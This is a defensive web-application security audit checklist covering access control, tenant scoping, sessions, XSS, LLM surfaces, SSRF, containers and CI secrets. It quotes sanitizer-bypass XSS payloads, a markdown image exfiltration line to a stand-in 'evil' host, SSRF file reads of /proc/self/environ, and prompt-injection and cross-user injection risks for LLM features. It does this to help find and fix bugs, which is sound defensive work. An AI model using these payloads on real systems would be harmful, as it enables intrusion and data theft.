# Checklist — patterns that turned into real findings

Each item: what to look for → how to confirm → typical fix. Ordered roughly by how often it was the root cause.

## 1. Endpoints reachable without the right permission
- **Look for:** every server function / API route / RPC handler. Classify: guarded by a permission check ·
  login-only · public. "Login-only" is the dangerous bucket — a call-center or viewer account (often with a shared
  seed password) then reads or writes everything.
- **Confirm:** for each login-only handler, read the body — some check inside (`assertReadable`, owner checks).
  Map each endpoint to the page(s) that call it and that page's guard; the endpoint must require the same.
- **Write endpoints guarded by a *view* permission** are a finding too (viewer can rewrite shared config).
- **Fix:** permission middleware matching the page guard (`any-of` when several pages share it); manage-level
  permission for writes; guard at all three layers (endpoint, route, UI).

## 2. Tenant / business scope from client-controlled input
- **Look for:** the tenant/business id derived from `Referer`, a header, a body field, or "last used" without a
  membership check (`assertMembership`, `WHERE tenant_id = session.tenant`).
- **Confirm:** can a member of tenant 1 read tenant 2 by changing that input?
- **Fix:** resolve the scope server-side from an entitlement rule identical to the route guard; fail only when the
  tenant DB is actually touched so non-tenant endpoints keep working for users with no membership. Check whether
  the membership table is even populated in prod before choosing the rule.

## 3. Privilege escalation through user/role administration
- **Look for:** create/update user accepting any `roleId`; role editor accepting any permission incl. the wildcard;
  editing your own role; resetting/deleting a user who outranks you; session admins revoking admins.
- **Rule that fixes it:** an actor may grant only roles/permissions that are a subset of their own; only wildcard
  holders grant the wildcard; nobody changes their own role; you can't touch a user who holds anything you don't.
- **Also:** password reset / role change / delete must revoke that user's sessions, API tokens (PATs), OAuth grants.
  PATs need a maximum lifetime.
- **Audit log:** append-only table written in the same transaction as each change (actor, action, target, diff
  without secrets, ip, user agent). Without it you can't answer "what else did they do?" after an incident.

## 4. Sessions and secrets
- **Look for:** `process.env.SECRET || 'literal'` — the literal is public (and often copied across repos: grep the
  user's other projects for the same string). CI that only checks "non-empty" accepts the `.env.example` placeholder.
- **Look for:** a sealed cookie holding `{userId, sessionToken}` where the server checks the token exists but not
  that it belongs to that userId → anyone who knows the secret + has any valid session becomes anyone.
- **Fix:** refuse to boot in production with a missing/short/placeholder secret; random per-process secret in dev;
  bind token→user; absolute session lifetime cap.

## 5. Seeds, defaults, and login
- **Look for:** seed scripts with literal passwords (admin + shared agent password), seeds that reset hashes,
  revive deleted users, or re-grant removed permissions when re-run.
- **Confirm in prod (read-only, counts only):** how many accounts still match the seed password.
- **Login:** no rate limit/lockout; unknown-user path returns before hashing (timing oracle); client IP from the
  left-most `X-Forwarded-For` (spoofable — use the entry your proxy appended).

## 6. Stored XSS sinks fed by outsiders
- `dangerouslySetInnerHTML`, `innerHTML`, `v-html`, `insertAdjacentHTML`, D3 `.html()`, map popups.
- **Chart libraries:** ECharts (and similar) put a *function* tooltip `formatter`'s return value into `innerHTML`.
  Any `${params.name}` / `seriesName` / row field interpolated there is a sink. String templates (`'{b}'`) and
  canvas labels are escaped/safe.
- **Entity decoding:** upstream systems often store `&lt;`; app helpers that decode entities for display re-arm
  the payload. Escape *after* decoding.
- **Sanitizers:** regex sanitizers are bypassable (`<img src=x/onerror=…>`, `<svg/onload>`, unclosed `<script`,
  `<scr<script></script>ipt>`). A DOM sanitizer that only runs client-side means SSR output uses the fallback.
- **Markdown:** raw HTML allowed (`rehype-raw`)? Mermaid `securityLevel`? Images auto-loading from any URL.
- **Fix:** one `escapeHtml` helper + a shared tooltip builder; strict CSP with nonces as the second layer.

## 7. User/LLM-generated files served from the app origin
- **Look for:** uploads or generated files (HTML, SVG, XML) served `inline` on the same origin.
- **Classic bug:** comparing a full MIME string — `'text/html; charset=utf-8' === 'text/html'` is false, so the
  sandbox header is never added. Compare the base type (lowercase, before `;`).
- **Fix:** inline only for raster images / PDF / audio / plain text; everything else `attachment` +
  `CSP: sandbox; default-src 'none'` + `nosniff`; ideally a separate origin.

## 8. AI / LLM surfaces
- **Prompt injection channel:** every attacker-controlled string in the LLM context (§ inventory). Assume it can
  make the model call any tool the *viewing user* can call.
- **Raw SQL tools:** same DB user as the app? Validator gaps — word-boundary keyword lists miss `load_file`,
  `pg_read_file`, `dblink`, `pg_sleep`, `set_config`, `pg_terminate_backend`, `query_to_xml`. Need: function
  denylist, sensitive table denylist (sessions, tokens, admin, config, gateways), sensitive column redaction incl.
  `SELECT *`, block whole-row tricks (`row_to_json(t)`, `t::text`).
- **Exfiltration:** markdown `![](https://evil/?d=…)` loads automatically → restrict images to same origin + CSP
  `img-src`.
- **Cross-user writes:** inserting a message into a conversation id before checking ownership → text injected
  into an admin's next turn. "Admin" endpoints whose middleware is an alias of plain login.
- **CSV/xlsx export:** cells starting with `= + - @` → prefix `'`.

## 9. Sandboxes and container blast radius
- `docker.sock` mounted into the web container (+ running as root) ⇒ any RCE in the app = root on the host and
  every other container's env. Ask: is the sandbox used at all in prod? If not, turn it off and drop the mount.
- Sandbox containers: `--network none` by default, non-root, cap-drop, limits, no host paths.

## 10. SSRF and file reads
- Server-side `fetch` of URLs that come from an upstream API, DB, or user. Bun/Node fetch variants may accept
  `file://` (→ `/proc/self/environ` = all secrets). Allow only `https:` + an explicit host list.
- Proxies that pass upstream `Content-Type` through → force expected types + `nosniff`.

## 11. Headers, framing, CSRF
- Check what prod *actually* sends (one `curl -sI`): CSP, `frame-ancestors`/`X-Frame-Options`, `nosniff`,
  `Referrer-Policy`, HSTS. A reverse proxy outside the repo may add some.
- OAuth consent pages without `frame-ancestors` can be clickjacked into approving an attacker's client.
- `SameSite=Lax` alone doesn't stop same-*site* subdomains; add an `Origin` / `Sec-Fetch-Site` check for
  cookie-authenticated state-changing requests (exempt bearer-token/OAuth endpoints).

## 12. Dependencies
- Run the audit; prioritise anything on a **pre-auth request path** — e.g. TanStack Start deserializes every
  `/_serverFn` body with seroval *before* middleware (seroval ≤1.5.2 had critical `fromJSON` advisories).
- `"latest"` ranges → pin. Transitive criticals → `overrides`. Dev-only criticals (test runners) → note, lower priority.
- Check the user's sibling repos for the same vulnerable versions.

## 13. Secrets and CI
- `.env*` tracked or ever committed? `git log --all -p -S'<pattern>'` for key prefixes (`sk-`, `AKIA`, `ghp_`,
  `BEGIN PRIVATE KEY`). Production secrets / SSH passwords sitting in a dev machine's `.env`.
- CI printing the env file on failure; CI sourcing fetched secrets as shell; runner on the prod host not limited
  to protected branches.
- Databases/object stores bound to a public IP.
